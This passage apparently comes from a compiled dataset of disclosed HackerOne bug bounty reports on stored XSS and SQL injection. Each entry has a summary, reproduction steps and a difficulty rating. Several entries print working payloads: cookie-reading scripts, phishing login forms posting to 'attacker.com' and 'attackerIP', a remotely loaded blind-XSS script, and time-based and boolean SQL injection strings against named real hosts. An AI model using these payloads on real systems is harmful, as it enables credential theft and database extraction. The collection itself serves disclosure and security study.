2. Fill in 64 different fields with XSS payloads (e.g., <script>alert(1)</script> or credential-stealing forms)
3. Submit the form and observe the payloads execute when viewed by legal personnel
4. For credential theft, use a payload like: <h3>Please login</h3><form action=http://attacker.com>...
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic XSS testing in visible form fields without requiring complex application state manipulation or multi-step logic. The large number of vulnerable fields increases discoverability.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/854445: Unrestricted file upload leads to stored xss on https://████████/
================================================================================
RAW DESCRIPTION:

Summary:
When the user want to upload a "certificate", the web app doesn't check the content-type of the file. A user can upload any kind of file (binary,html,...)
Step-by-step Reproduction Instructions
Create an account at https://██████/████████/app/registration/basic-info
When you are connected, click on "certification"
Upload this file as xss.html and save the modifications:
Code 230 Bytes
1<!DOCTYPE html>
2<html>
3  <head>
4    <title>Simple Test</title>
5    <meta name="viewport" content="initial-scale=1.0">
6    <meta charset="utf-8">
7  </head>
8  <body>
9    <script>
10	alert(document.cookie	)
11	</script>
12  </body>
13</html>
3 . Go back to the "certification tab " and open the attachement in a new tab
POC :https://███/████/registration-service/files/███████.html
Suggested Mitigation/Remediation Actions
Restrict the content-type of the uploaded files
Impact
The unrestricted file upload vulnerability leads to stored xss.



================================================================================
Vulnerability Description:
The vulnerability allows unrestricted file upload, leading to stored XSS. The web app does not validate the content-type of uploaded files, enabling users to upload malicious HTML files that execute JavaScript when opened.

Steps to Reproduce:
1. Create an account at https://██████/████████/app/registration/basic-info
2. When connected, click on 'certification' and upload the provided xss.html file
3. Go back to the 'certification tab' and open the attachment in a new tab
Exploitation Difficulty:
The attack is straightforward, involving basic file upload manipulation without complex interactions or state manipulation. The vulnerability is common and well-documented in web security.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/867133: Stored XSS on https://apps.topcoder.com/wiki/pages/editpage.action
================================================================================
RAW DESCRIPTION:

Summary:
Hi :) There is a stored XSS on wiki pages and it executes when editing page.
Steps To Reproduce:
After I submitted #867125, i realized that the vote macro causes stored XSS on wiki edit page.
A user can edit wiki pages on https://apps.topcoder.com/wiki/pages/editpage.action?pageId=. Users can insert macros to pages. Vote macro is vulnerable to XSS.
Go to a wiki page, edit it and type
Code 107 Bytes
1{vote:What is your favorite vulnerability?}
2RCE
3SSRF
4XSS"><img src=X onerror=alert(document.domain)>
5{vote}
and save it. When an other user edit this page, XSS will execute.
<image_0>
Note: This only works to signed-in users. Because unauthorized users cannot edit pages. I think there is a mistake on https://apps.topcoder.com/wiki/login.action now. If you encounter an error, you can login on main site (https://accounts.topcoder.com/member) then try.
Impact
XSS can use to steal cookies or to run arbitrary code on victim's browser.



================================================================================
Vulnerability Description:
A stored XSS vulnerability exists in the vote macro functionality of the Topcoder wiki. When a malicious vote macro containing an XSS payload is saved to a wiki page, the payload executes when another user edits the page. This allows attackers to execute arbitrary JavaScript in the context of the victim's session.

Steps to Reproduce:
1. Navigate to a wiki page on https://apps.topcoder.com/wiki/pages/editpage.action?pageId=
2. Insert the following vote macro with XSS payload:
{vote:What is your favorite vulnerability?}
RCE
SSRF
XSS"><img src=X onerror=alert(document.domain)>
{vote}
3. Save the page. The XSS will execute when another user edits this page.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a common XSS pattern in a macro system. The only complexity comes from needing to know that the vote macro exists and that it doesn't properly sanitize input. The attack doesn't require multiple components, complex state manipulation, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/915073: Stored XSS via Comment Form at ████████
================================================================================
RAW DESCRIPTION:

Summary:
An attacker can submit a comment form with injected HTML, leading to a number of malicious effects
Step-by-step Reproduction Instructions
Browse to https://████
Complete the form. I placed "><script src=http://attackerip/blind.js/> in the Name field. Some example payloads for the Comments field are as follows:
For credential theft, an attacker could place <h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br> in the Comments field.
███████
████
To redirect to a malicious website, an attacker could use <img src=x onerror='javascript:window.open("http://catcompusa.com")'></img>.
██████
The malicious website will open in a new tab when the image fails to load as shown below:
█████████
Conclusions
This leads me to believe that once a █████████ employee reads the comment, the code will be injected into their browser as well.
Additionally, the blind XSS payload injected into the Name field seemed to cause a hit on my weblog from █████████ and ██████████. █████
Suggested Mitigation/Remediation Actions
Sanitize how user input is parsed by the server before being reflected onto the resulting comment page to prevent XSS/HTML injection.
Impact
The attacker could achieve numerous effects such as credential theft, forced browsing, keystroke logging, drive-by downloads, etc. ultimately leading to administrative access over the █████ website and potentially other internal resources.



================================================================================
Vulnerability Description:
A stored Cross-Site Scripting (XSS) vulnerability exists in the comment form of the target website, allowing attackers to inject malicious scripts that execute in the context of other users' browsers when the comments are viewed. This can lead to credential theft, forced browsing, or other malicious actions.

Steps to Reproduce:
1. Browse to the target website and locate the comment form.
2. Inject malicious HTML/JavaScript payloads into the Name and Comments fields (e.g., `<script src=http://attackerip/blind.js/>` or `<form action=http://attackerIP>`).
3. Submit the form and observe the execution of the payload when the comment is viewed by an employee or another user.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves injecting common XSS payloads into input fields without any complex interactions or state manipulations. The attack does not require understanding of novel logic or subtle interactions between components.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/923912: Blind Stored XSS on the internal host - █████████████
================================================================================
RAW DESCRIPTION:

Description
Hello. I often use mine xp.ht host as a beacon for SSRF/XSS payloads, and today one was triggered from the https://███████████████/NSSI/controlcenterV2/index.htm?directlink&courses/classes/findstudent&&&&&&&& endpoint (it was found in the Referer header)
This domain isn't resolvable from outside, so I assume the request came from host in the internal network, connected to extranet.
POC
███████
Sadly, I'm not sure where is exactly the entry point was for the payload - only the vulnerable URL where it triggered the pingback to my host.
The GET /?_=1594756841631 indicated that payload is likely reside in HTML source, and was triggered during student lookup (perhaps there is payload somewhere in the student data containing <script src=//xp.ht></script> or similar).
You may need to confirm this with system owner first since I don't have enough details to confirm it from my side since vulnerable host is internal.
Impact
Blind Stored XSS on the internal host.



================================================================================
Vulnerability Description:
Blind Stored XSS on an internal host where the payload was triggered from a student lookup functionality, likely due to malicious script injection in student data.

Steps to Reproduce:
1. Use xp.ht host as a beacon for SSRF/XSS payloads.
2. Observe the pingback triggered from the internal host at the specified URL.
Exploitation Difficulty:
The vulnerability involves identifying a blind XSS through indirect means (pingback observation) without direct access to the internal host or clear entry point. The tester had to infer the vulnerability's existence and potential impact based on external observations.

--------------------------------------------------------------------------------



SQL Injection Vulnerabilities (13 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1015406: SQL Injection in www.██████████
================================================================================
RAW DESCRIPTION:

Description:
SQL Injection is a vulnerability which allows interference with the queries performed on a database, to obtain sensitive information which could be really useful to attackers. A web application database is often queried using user-requests parameters, which when are not properly sanitized can be modified injecting malicious code. In this case, the vulnerable endpoint is http://www.████████ and the vulnerable parameter is the POST rnum parameter. Respecting the program guidelines, I performed the minimal amount of testing required to prove that a vulnerability existed, but please tell me if I can bring the exploitation further to give more information.
Reproduction steps
1 -Repeat the below requests with a interceptor proxy (for example, using Burp).
Code 609 Bytes
1POST ████ HTTP/1.1
2Host: www.████
3Content-Length: 72
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6Origin: http://www.███████
7Content-Type: application/x-www-form-urlencoded
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10Referer: http://www.███████████
11Accept-Encoding: gzip, deflate
12Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
13Cookie: PHPSESSID=█████
14Connection: close
15
16███████
Code 618 Bytes
1POST ██████████ HTTP/1.1
2Host: www.███████
3Content-Length: 72
4Cache-Control: max-age=0
5Upgrade-Insecure-Requests: 1
6Origin: http://www.█████
7Content-Type: application/x-www-form-urlencoded
8User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
10Referer: http://www.████████████████
11Accept-Encoding: gzip, deflate
12Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7
13Cookie: PHPSESSID=████
14Connection: close
15
16█████
In the first case, the record obtained from the database is the following:
Code 6 Bytes
1██████
██████
Whilst in the second case, the record obtained is:
Code 3 Bytes
1███
█████
This confirms that the OFFSET clause is concatenated to the original query and there is the possibility to exploit a SQL Injection.
Impact
The vulnerability could allow an attacker to dump sensitive and personal data from the web application database (such as usernames and password hashes) or to perform authentication bypasses.



================================================================================
Vulnerability Description:
SQL Injection vulnerability in the 'rnum' parameter of the POST request, allowing attackers to manipulate database queries and potentially access sensitive data.

Steps to Reproduce:
1. Intercept the HTTP POST request to the vulnerable endpoint using a proxy like Burp Suite.
2. Modify the 'rnum' parameter in the POST request to inject SQL code that alters the database query, such as changing the OFFSET clause.
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection in a single parameter without complex interactions or state manipulations. The attack is based on well-known SQL injection techniques.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1034625: Blind SQL injection at tsftp.informatica.com
================================================================================
RAW DESCRIPTION:

The parameter refresh_token sent to the REST path /api/v1/token is vulnerable to blind SQL injection.
Compare the response time of these 2 requests:
Code 357 Bytes
1$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
2{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
vs
Code 359 Bytes
1$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
2{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
and notice that the WAITFOR DELAY command is executed.
Impact
Blind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.
I stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.



================================================================================
Vulnerability Description:
The refresh_token parameter in the /api/v1/token endpoint is vulnerable to blind SQL injection, allowing attackers to execute arbitrary SQL commands and potentially exfiltrate data, bypass authentication, or achieve remote code execution.

Steps to Reproduce:
1. Send a POST request to https://tsftp.informatica.com/api/v1/token with a malicious refresh_token parameter containing a SQL injection payload (e.g., '; WAITFOR DELAY '0:0:1'--)
2. Observe the response time delay corresponding to the injected WAITFOR DELAY command, confirming SQL injection
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection via a single parameter with clear time-based confirmation. No complex application states or novel logic is required - this is a classic blind SQL injection pattern.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1125752: SQL Injection on https://soa-accp.glbx.tva.gov/ via "/api/" path - VI-21-015
================================================================================
RAW DESCRIPTION:

Summary:
i've found this subdomain soa-accp.glbx.tva.gov also is vulnerable to SQLI through /api/ path
Steps To Reproduce:
https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+- hostname dumped
https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+@@version--+-
Microsoft SQL Server 2017 (RTM-CU22-GDR) (KB4583457) - 14.0.3370.1 (X64) \n\tNov 6 2020 18:19:52 \n\tCopyright (C) 2017 Microsoft Corporation\n\tEnterprise Edition (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\n
also you can retest it through time bassed trick
time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"
<image_0>
Impact
An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.



================================================================================
Vulnerability Description:
The subdomain soa-accp.glbx.tva.gov is vulnerable to SQL injection through the /api/ path. An attacker can manipulate SQL statements sent to the Microsoft SQL Server database, allowing them to extract sensitive information such as hostnames and database versions, or execute arbitrary SQL commands.

Steps to Reproduce:
1. Access the vulnerable endpoint: https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'
2. Append SQL injection payload: '+%2f*!50000union*%2f+SELECT+HOST_NAME()--+- to dump the hostname
3. Alternatively, use time-based SQL injection: '+WAITFOR+DELAY+'0:0:10'--+- to confirm vulnerability
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection attack with common techniques like UNION-based and time-based injections. The attack does not require complex application state manipulation or understanding of novel logic. The components involved are standard for SQL injection vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/117073: [informatica.com] Blind SQL Injection
================================================================================
RAW DESCRIPTION:

Hi guys!
JSON POST parameter "docId" is vulnerable to Blind SQL Injection attack
PoC (Raw query)
POST /_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings HTTP/1.1
User-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.17
Host: kb-test.informatica.com
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://kb-test.informatica.com/KBExternal/pages/infasearch.aspx?k=pew
Cookie: ASP.NET_SessionId=03khmmjpaxvcos45opn2kg55; BIGipServerkb-test-pool=2670002442.22811.0000; WebAnalyticsSessionId2=b600796d-cd0e-4797-9610-872c18063793; kbemail=; mkt_cookie=anonymous; __cdrop=.D1P9XM.; _ga=GA1.2.1961398489.1453319834; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1452163097365-89988; s_vnum=1458351793680%26vn%3D1; gpv_p14=welcome%20page%3Awelcome; s_ppv=-%2C76%2C76%2C947; s_cc=true; gpv2=kb%3Aproddocsearch; s_nr=1455762795883-Repeat; s_invisit=true; s_sq=informatica-mysupport-dev%3D%2526pid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%2526oid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%252523%2526ot%253DA; wooTracker=vALSmwIXvuQp; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16850%7CMCMID%7C49728577452301121918884624029572688913%7CMCAAMLH-1456367601%7C6%7CMCAAMB-1456367601%7CNRX38WO0n5BH8Th-nqAG_A%7CMCAID%7CNONE; mbox=check#true#1455762863|session#1455762802845-749291#1455764663
Connection: Keep-Alive
Content-Length: 117
Accept: application/json, text/javascript, /; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8
{docId:"1 and (select substring(@@version,1,1))='M'", docTitle:'Getting an error while trying to import WSDL as...' }
for a TRUE query we get - {"d":"3"}
for a FALSE - {"d":""}
for a Syntax error - {"Message":"There was an error processing the request.","StackTrace":"","ExceptionType":""}
so using this blind technique we can extract the data from Database
examples
docId:"1 and (select substring(@@version,1,1))='M'" - true
docId:"1 and (select substring(@@version,2,1))='i'" - true
docId:"1 and (select substring(@@version,3,1))='c'" - true
docId:"1 and (select substring(@@version,22,1))='2'"
docId:"1 and (select substring(@@version,23,1))='0'"
docId:"1 and (select substring(@@version,24,1))='0'"
docId:"1 and (select substring(@@version,25,1))='8'"
and so on.. . So we have a MS SQL Server 2008



================================================================================
Vulnerability Description:
The 'docId' parameter in the JSON POST request is vulnerable to Blind SQL Injection, allowing an attacker to extract database information by manipulating boolean conditions in the SQL query.

Steps to Reproduce:
1. Send a POST request to '/_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings' with a JSON payload containing a 'docId' parameter.
2. Manipulate the 'docId' parameter with SQL injection payloads to extract database information through boolean-based blind SQL injection.
Exploitation Difficulty:
The attack involves a straightforward manipulation of a single parameter in a POST request to perform boolean-based blind SQL injection. The complexity is low as it does not require understanding of multiple components, complex application states, or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1278928: blind sql on  [ https://argocd.upchieve.org/login?return_url=id= ]
================================================================================
RAW DESCRIPTION:

Summary:
[i have discoverd a blind sql on your site login page which i confirmed using two scenarios to confirm its existance.]
Steps To Reproduce:
[add details for how we can reproduce the issue]
use the following payloads
this one retured a 200 ok response confirming sql vulnerability existance
id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136
this one was blocked confirming the first one is going through and can be weponised
70418291&comment_id=291751-benchmark(1000000000,1-1)&hash=f42ffae0449536cfd0419826f3adf136
example link on how to reproduce [ https://argocd.upchieve.org/login?return_url=id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136]
Why -sleep(5), -benchmark(1000000000,1-1) payloads were used? I suspected that comment_id was processed as integer and was unescaped in the query so int-sleep(t) is a valid construction whatever the full query is, which doesn't require various quote/parenthesis tests for the quick manual confirmation. I found it also useful when WAF/filters block the quotes.
The severity was set to High because I propose Critical only for content injections:)
Supporting Material/References:
[ https://owasp.org/www-community/attacks/Blind_SQL_Injection ][https://gerbenjavado.com/manual-sql-injection-discovery-tips/]
Recommendations for Fixing/Mitigation
[The only sure way to prevent SQL Injection attacks is input validation and parametrized queries including prepared statements. The application code should never use the input directly. The developer must sanitize all input, not only web form inputs such as login forms.]
Impact
The impact SQL injection can have on a business is far-reaching. A successful attack may result in the unauthorized viewing of user lists, the deletion of entire tables and, in certain cases, the attacker gaining administrative rights to a database, all of which are highly detrimental to a business.



================================================================================
Vulnerability Description:
A blind SQL injection vulnerability exists in the login page of the application. The vulnerability allows an attacker to execute arbitrary SQL commands by injecting malicious payloads into the 'id' parameter, which can lead to unauthorized data access or manipulation.

Steps to Reproduce:
1. Navigate to the login page: https://argocd.upchieve.org/login?return_url=id=
2. Inject the SQL payload: id=291751-sleep(5)&hash=f42ffae0449536cfd0419826f3adf136
Exploitation Difficulty:
The vulnerability discovery involves straightforward SQL injection techniques using common payloads (sleep and benchmark). The attack does not require complex interactions or understanding of multiple components, making it relatively easy to discover.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1893800: SQL Injection in CVE Discovery Search 
================================================================================
RAW DESCRIPTION:

Summary:
Unsanitized user-controlled inputs in the CVE Discovery Search allow for SQL injection.
Description:
Search terms are split on whitespace but no additional sanitization is applied, allowing arbitrary SQL statements, such as a blind or timing-based attack.
Steps To Reproduce
Visit https://hackerone.com/intelligence/cve_discovery
Enter a search term that normally returns results, plus an injection payload such as //AND//'1%'='1 and confirm that the results are still returned
Change the payload to //AND//'1%'='0 and confirm that no results are returned
Optional: Your Environment (Browser version, Device, etc)
Chrome
Optional: Supporting Material/References (Screenshots)
<image_0>
Impact
Disclosure of data in Analytics Database, including report, team, and asset data



================================================================================
Vulnerability Description:
Unsanitized user-controlled inputs in the CVE Discovery Search allow for SQL injection. Search terms are split on whitespace but no additional sanitization is applied, allowing arbitrary SQL statements, such as a blind or timing-based attack.

Steps to Reproduce:
1. Visit https://hackerone.com/intelligence/cve_discovery
2. Enter a search term that normally returns results, plus an injection payload such as //AND//'1%'='1 and confirm that the results are still returned
3. Change the payload to //AND//'1%'='0 and confirm that no results are returned
Exploitation Difficulty:
The vulnerability involves a straightforward SQL injection attack with no complex interactions or state manipulations required. The attack is based on common SQL injection techniques and does not require novel logic or deep understanding of the application's internal workings.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2081316: Blind Sql Injection in https://█████/qsSearch.aspx
================================================================================
RAW DESCRIPTION:

Description:
access
https://████████/qsSearch.aspx
Click to sort capture packets
Code 4.69 KiB
1POST /qsSearch.aspx HTTP/1.1
2Host: ████████
3Cookie: ASP.NET_SessionId=qrwzcesx1pczpna5a1bumabn; TS01e0cc7d=01a9fe659bc0aaa5aeffd1dcb0212ef4158c4865925e960169a653a233f6de5425138871ffe81b759d57e8cd4d192f460a8455c20a; TS64c50bb0027=085749d0e4ab2000abff03ce041a6de3cdc980bad78329f846f8a7d1a3ca714fca41b9f4477ff74908e5615eaa1130003df96bf750318bbc06de7b8d1dc03b675cf0ea51da191b5c8a95008b8d5b3f758c0ed139489903314d8927a8c58c8d9d
4Content-Length: 3764
5Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
6Sec-Ch-Ua-Mobile: ?0
7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
8Content-Type: application/x-www-form-urlencoded; charset=UTF-8
9Cache-Control: no-cache
10X-Requested-With: XMLHttpRequest
11X-Microsoftajax: Delta=true
12Sec-Ch-Ua-Platform: "Windows"
13Accept: */*
14Origin: https://██████
15Sec-Fetch-Site: same-origin
16Sec-Fetch-Mode: cors
17Sec-Fetch-Dest: empty
18Referer: https://██████████/qsSearch.aspx
19Accept-Encoding: gzip, deflate
20Accept-Language: zh-CN,zh;q=0.9
21Connection: close
22
23ScriptManager1=UpdatePanelWhole%7CGetFilteredButton&DocumentIDTextBox=&IDNumberTextBox=&DropDownListStatus=&DocumentTitleKeyWords=&DropDownListContains=AND&DropDownListTitleOrKeywords=TOS&TextBoxBegin_Date=24-Jul-2022&TextBoxEnd_Date=24-Jul-2023&FromSession_HFS=0&DocumentIDTextBox_HFS=&IDNumberTextBox_HFS=&DropDownListStatus_HFS=&DocumentTitleKeyWords_HFS=&DropDownListContains_HFS=&DropDownListTitleOrKeywords_HFS=&ExListBoxFSCHF=1010&ExListBoxFSCHFN=2&ExListBoxFSCHFN_HFS=&UseTransDateCheckBox_HFS=&TextBoxBegin_Date_HF=24-Jul-2022&TextBoxEnd_Date_HF=24-Jul-2023&TextBoxBegin_Date_HFS=24-Jul-2022&TextBoxEnd_Date_HFS=24-Jul-2023&Command_HFS=&divPreamble_HF=block&HiddenFieldSortOrder=seqno&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=q7mOdp7JADLouhLb0iBsjhyqsgYBjR4m66bmTYp5jGGY0Unk%2FoBSV%2FV5DY4cM8i4AetQ7yIP7NpGAwDZNg1mENuO17N0e9RMjj9k84Mz8Z12lbblsQ3pvMzMXGqVFlV5AapE1ZPF3Lw3mHyNQwU9U8rmLIlySVVc9Fq9r1FEk4E198exJH0aVmUhqMLdX6ah4%2F4jaTRYRASPB6C8VdKG2gvAnVsh%2BQzU05lZGLYsqw8j8EiFXbKKni0hgSjiD%2B%2BanYn9w4xMz5llIOP81jz9jSB479hqo3yuFWuOO91Vr539KvcO7XzstILWDgVLtDeDPw3p2DTZM2PS0vOVnNDpJX6rr76mJfFWD9DJUOSkvCDpz0tGwNcGWZPO0j%2FkaUY%2Fh9L5%2FOblr4Zd6XcWiyo3Sal%2BtCvQnZuzPyCjL33IEpuGojcsUBeY8Aq%2FkFbVr%2Be3cXUSzzBwirfXTdneWQFQlfq8xWxKI2YHsnLZHLNKB3%2FsgP0vvRV1yXvsbC9RfTGhUiK2S%2Bg4XHzadLggy5djNZMHvoulqRwagO7EeksJyWGma9jVCQoc4Vqe3IjRbjmyaZOltk%2BZxh%2FC9P%2BPdT9lhapBOyuXvVDJL862rRIIfJEUo9NJ0ES%2FRRHdk2NO44DsXT99Rj89iOZY1ZgFaAqQEYXhVQEIfFdyMjP52QR2d6ljjjQahESe88R34h9YuLQVGMnZnqwCSgOqjD%2Fw7iuA4fkYrq5zu2muXogAnT%2BYdVe03PNUlMAhdr3oVzTmipt2ezsMpNtGU%2B%2FKO67w8xvPtdMcU1r%2FDWXlU%2BMgnxpWKBfcwk8BMKvSStAX7lxPg%2BAFXJ4W%2B4mMAg6xybe8nfyVtfbcC%2FLT21%2FAo6DA1EP0%2Bquy6r7RSx%2BCSQiQ9FMEn29J%2FEvOYsub01L3h%2FHXt5%2BgfM9lWS1DRQmEbIT9Sy9aXm895QHjFJwR4ZKU%2FV2YqyvpqYxBstMen3tClb74MXUOGLEwkR2SajMOnEvafbc2eND%2BeGkhPvX308aFuCcS92UIOD0YE52Xf%2FvCaFkbYhBFQ3DDTvEsKYq%2Feiv2tdt3t34jpVDYpVuZBjYrE5CKYNZ%2FshSfBGFd3WkyogypS6WwmW4p8tAIP6nZbewu3ljQmfclpQfSEZ1U86hc7R6%2F8Qi5H%2FUoPZkSXdhS7YZ%2FUk2uEFJpMPbwrRIisJZDWOK1iXXUfLGlJNHpqXz%2By1HAWEAgoROMjB3PDciwlG4qOWWNf8kHBIXh4mABbQTBRCSviGCU%2B40mxFN5mCxIDlyVSrZtctMDlDEXxsDrgMlIYF9tPu14HiIkcvTvRRDAilxLNj4oJltCSn9Q4KaohPoOCTCB%2FBDChs7i%2FP%2FtVlVv2hseFoW%2FL5nnXrzZwtQ89g1tukB6B0%2BLNIHSPMTNjHfS94KBTjlI%2BDyJQ1moLRAqrI08LuxR5oL4I4xQWFMokDUes%2F9919T%2BsFFY83LeW8l2cnq9HXs1VHWZC52iEE6NKL3O%2FY8rb8ZzJWx73Vy6%2F4ycbMhmXmBKDL0jPp7pWQwCSF%2Bi3utC6fYzXYVplK%2F%2FUB%2Bl%2Fx3FHulj%2BxbNXbXDNwW9la1gvmiZCBVNBF8Hs9f723CNP9Mk36HeRhnqrv%2BXjT3ru9VUIreZuYLP%2FJMDsMa5hkxNqsGSiYSaVnQdNoh16MX%2FpwD9TFjeLR9trbuYbOe85Q%3D%3D&__VIEWSTATEGENERATOR=23D07230&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=fsWUuj%2Bv6uAzn%2BPDJy53TOV1EcwpGMzzgrX8HnHdm3%2BXLE0nnYzmv2wV%2FC1MQ36juB9R3FuomPHAhDRTQjaWLLfUo8wqsKkA5oRH27Q0drnd19OLne7P%2F1e7JVyrg3T7IUqgzt668Uf70ylQ0%2Fzm3R8l55e7NMhkJqrNAfwmRnqo01McSaS%2FfV2vktFK2Xg07rplRCRRnjFxz7PgRNyHTd27PGi2JuvyZ661dcSKhHjRUnOe2JvQjiSZRCepgNLisbabLxz3fm%2B1iLqiMbDSRQ%2B%2FD9NNzQ7zv3dFfSQUnFPX7n1%2BN1rxmuSYIrjumhEcO4WaCoted6V4GkC2aj2XlwuOdyJCc5KK83LLHqei%2FQ%2BOYJ70T2sxY5kfRDyc6T5%2BMoqHE6Xl9T6fgHQNss4Ed5vnM1hZ3wZQF2roYILiJnGRewNWVEtDjNbGId6AosGd%2BG8TPm5qmRver%2Fwe%2F61TFc7jVz6dKVS30uH7AAbYcbuytwOXLSNwGrfEQdJWBRfL0fof2hrE1%2BnpdhhTCaZr09ezPUk6vJZKXWxxwYfIcDAiy6VF696%2BrN1sK3DqQY2Ml1ycdVU9IGR7gt0JAr256BTzhp2JqdP3MUmPfzzJUb8yPVIdutWg4s6wd9hZJOffo1XGfM97vgmG31OsKt6Ce5%2Fnvd9EtqYThA73N7lRz3Rbia%2FoGCb%2BSZT%2Fgry9ERSpe772GIZgiIkfmmIH81KdA3ng3UGEUW%2BJQaJ1nqUpqa%2BkvQoXNYP6cgpyJXpqPUBh92Dur9tj6rGmgFWcHMly1EoNjkhmUq2A3Rx3Y4cv8%2F%2FFXK0Q3FHiGe838a3kotnxO5JySmyB%2FaV4pfNfyo0YVRk51Od9eE7%2FtAKgSe11mFqXg2cB0SEJn7JIhMBuozxVV6hW1ja2QpLVxqZxfar1K3Fw8gk%2FOcYpDaEVlE8MLzAft9GeMFoKWMCNXkY9jz80fSlJzDLSHEZ%2BVahTxgsrEeQpo9IzdKvvm2p6RPOYIS4%3D&__ASYNCPOST=true&GetFilteredButton=Search
HiddenFieldSortOrder is sql injection parameter
███
payload：
user length=5
seqno-DECODE(length(user),5,1,1/0) The page returns normal data
█████
The length of the user is incorrect, and the page returns abnormal data
████████
and
user=QSWEB
seqno-DECODE(lpad（user,5),'QSWEB',1,1/0) The page returns normal data
███
The database user does not return abnormal data to the page
███
We can use the burp intruder template to violently enumerate database usernames .Judging whether the user is correct based on the returned length
███
█████
References
Impact
An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.
System Host(s)
██████
Affected Product(s) and Version(s)
CVE Numbers
Steps to Reproduce
seqno-DECODE(lpad(user,5),'QSWEB',1,1/0)
true
seqno-DECODE(lpad(user,5),'QSWE1',1,1/0)
false
Suggested Mitigation/Remediation Actions



================================================================================
Vulnerability Description:
The vulnerability is a Blind SQL Injection in the 'HiddenFieldSortOrder' parameter of the qsSearch.aspx page. An attacker can manipulate this parameter to execute arbitrary SQL queries, allowing them to bypass authentication, retrieve database contents, or modify data. The attack is confirmed by observing differences in page responses (normal vs. abnormal) based on the correctness of the injected SQL conditions.

Steps to Reproduce:
1. Access the vulnerable page at https://█████/qsSearch.aspx
2. Intercept the request using a proxy tool like Burp Suite and modify the 'HiddenFieldSortOrder' parameter with SQL injection payloads such as 'seqno-DECODE(length(user),5,1,1/0)' or 'seqno-DECODE(lpad(user,5),'QSWEB',1,1/0)'
Exploitation Difficulty:
